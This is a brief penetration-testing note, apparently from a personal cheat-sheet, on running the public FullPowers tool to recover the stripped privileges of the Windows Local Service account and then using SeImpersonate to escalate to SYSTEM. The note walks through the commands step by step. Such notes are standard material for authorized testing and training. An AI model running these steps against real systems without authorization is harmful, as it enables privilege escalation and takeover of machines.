# Recover privileges of NT Authority Local Service Account

## Source: https://itm4n.github.io/localservice-privileges/ and https://github.com/itm4n/FullPowers

### Steps:

1) Check your privileges

        whoami /priv

2) Run the FullPowers tool to regain the privileges of the NT Authority Local Service account we are currently on

        FullPowers -x

3) Check your privileges again

        whoami /priv

If the bug was successful, then you can use the SeImpersonate Privilege or any other sensitive one to go for privilege escalation to SYSTEM user
